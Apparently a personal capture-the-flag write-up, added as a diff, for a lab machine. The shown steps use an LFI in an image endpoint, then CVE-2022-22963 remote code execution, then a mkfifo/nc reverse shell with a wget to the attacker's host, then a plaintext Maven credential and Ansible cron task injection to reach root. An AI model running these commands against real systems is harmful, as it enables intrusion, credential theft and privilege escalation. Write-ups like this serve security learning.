@@ -1,0 +1,163 @@
+--------------------------------------------------OverView--------------------------------------------------
+* User-Flag: 
+	- Using LFI to get version of modul Tomcat used
+	- Using CVE-2022-22963 to get shell with Frank
+	- Enumaration .m2(maven build information) to Horizontal PE => Phil => user.txt
+* Root-Flag: 
+	- pspy => cron-tab => ansible-parallel run as sudo
+	- /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml => inject yml to upgrade shell
+	- PE => root
+
+--------------------------------------------------Tools--------------------------------------------------
+* User-Flag:
+	- Burp
+	- CVE-2022-22963 (ref: https://github.com/lemmyz4n3771/CVE-2022-22963-PoC)
+
+* Root-Flag:
+	- PSPY
+	- GTFO
+
+--------------------------------------------------Exploit--------------------------------------------------
+* User-Flag:
+	- Start enum with nmap + naabu: nmap -sCV -Pn -F 10.10.11.204
+		PORT     STATE SERVICE     VERSION
+		22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+		| ssh-hostkey:
+		|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
+		|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
+		|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
+		8080/tcp open  nagios-nsca Nagios NSCA
+		|_http-title: Home
+		|_http-open-proxy: Proxy might be redirecting requests
+		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+	
+	- Dirseach, wfuzz, .... => Tomcat + java
+	
+	- Port 8080 => upload + showimage (login + register not work).
+	
+	- Upload => rabit hole| Showimage => LFI
+	
+	- Tomcat server => pom.xml: /show_image?img=../../../../WebApp/pom.xml
+		<?xml version="1.0" encoding="UTF-8"?>
+			<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+				xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+				<modelVersion>4.0.0</modelVersion>
+				<parent>
+					<groupId>org.springframework.boot</groupId>
+					<artifactId>spring-boot-starter-parent</artifactId>
+					<version>2.6.5</version>
+					<relativePath/> <!-- lookup parent from repository -->
+				</parent>
+				<groupId>com.example</groupId>
+				<artifactId>WebApp</artifactId>
+				<version>0.0.1-SNAPSHOT</version>
+				<name>WebApp</name>
+				<description>Demo project for Spring Boot</description>
+				<properties>
+					<java.version>11</java.version>
+				</properties>
+				<dependencies>
+					<dependency>
+						<groupId>com.sun.activation</groupId>
+						<artifactId>javax.activation</artifactId>
+						<version>1.2.0</version>
+					</dependency>
+
+					<dependency>
+						<groupId>org.springframework.boot</groupId>
+						<artifactId>spring-boot-starter-thymeleaf</artifactId>
+					</dependency>
+					<dependency>
+						<groupId>org.springframework.boot</groupId>
+						<artifactId>spring-boot-starter-web</artifactId>
+					</dependency>
+					<dependency>
+						<groupId>org.springframework.boot</groupId>
+						<artifactId>spring-boot-devtools</artifactId>
+						<scope>runtime</scope>
+						<optional>true</optional>
+					</dependency>
+					<dependency>
+						<groupId>org.springframework.cloud</groupId>
+						<artifactId>spring-cloud-function-web</artifactId>
+						<version>3.2.2</version>
+					</dependency>
+					<dependency>
+						<groupId>org.springframework.boot</groupId>
+						<artifactId>spring-boot-starter-test</artifactId>
+						<scope>test</scope>
+					</dependency>
+					<dependency>
+						<groupId>org.webjars</groupId>
+						<artifactId>bootstrap</artifactId>
+						<version>5.1.3</version>
+					</dependency>
+					<dependency>
+						<groupId>org.webjars</groupId>
+						<artifactId>webjars-locator-core</artifactId>
+					</dependency>
+				</dependencies>
+				<build>
+					<plugins>
+						<plugin>
+							<groupId>org.springframework.boot</groupId>
+							<artifactId>spring-boot-maven-plugin</artifactId>
+							<version>${parent.version}</version>
+						</plugin>
+					</plugins>
+					<finalName>spring-webapp</finalName>
+				</build>
+			</project>
+	
+	- LFI: org.springframework.boot 2.6.5 + java 9 => CVE-2022-22965 => rabit hole
+	
+	- LFI: org.springframework.cloud 3.2.2 => CVE-2022-22963 => RCE (ref: https://github.com/lemmyz4n3771/CVE-2022-22963-PoC)
+	
+	- Get reverse-shell: echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.38 7050 >/tmp/f" > nsrce.sh
+						 python3 CVE-2022-22963.py 10.10.11.204:8080 'wget http://10.10.16.38:8000/nsrce.sh -O /tmp/nsrce.sh'
+						 python3 CVE-2022-22963.py 10.10.11.204:8080 'chmod +x /tmp/nsrce.sh'
+						 python3 CVE-2022-22963.py 10.10.11.204:8080 '/bin/sh -c /tmp/nsrce.sh'  
+	
+	- Get Shell as Frank, get Phil credential from /home/phil/.m2/settings.xml (because phill is maven bulder ????)
+		<?xml version="1.0" encoding="UTF-8"?>
+		<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+				xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+		  <servers>
+			<server>
+			  <id>Inject</id>
+			  <username>phil</username>
+			  <password>DocPhillovestoInject123</password>
+			  <privateKey>${user.home}/.ssh/id_dsa</privateKey>
+			  <filePermissions>660</filePermissions>
+			  <directoryPermissions>660</directoryPermissions>
+			  <configuration></configuration>
+			</server>
+		  </servers>
+		</settings>
+	
+	- Horizontal PE : su phil DocPhillovestoInject123 => root.txt
+	(phil is not ssh able ??? not in sudoer ???)
+* Root-Flag:
+	- Get stable shell: python3 -c 'import pty; pty.spawn("/bin/bash")'
+						CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
+	- Check id and groups of phil: id => staff	
+	
+	- Check all directory with group staff: find / -group staff -ls 2>/dev/null
+		183353      4 drwxrwxr-x   2 root     staff        4096 Mar 22 10:40 /opt/automation/tasks
+		131076      4 drwx------   6 root     staff        4096 Mar  6 13:15 /root
+	
+	- pspy to get get runed process 
+		/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
+	
+	- GTFO create yml to upgrade current tty:
+		ps -a
+		PID TTY          TIME CMD
+		6913 pts/0    00:00:00 su
+		6916 pts/0    00:00:00 bash => my shell session
+		8437 pts/0    00:00:00 ps
+	
+	- echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > test.yml => orginal from gtfo
+	  echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/pts/0 >/dev/pts/0 2>/dev/pts/0]}]' > test.yml => change tty (current shell session) to pts/0 (my shell session)
+	
+	- root
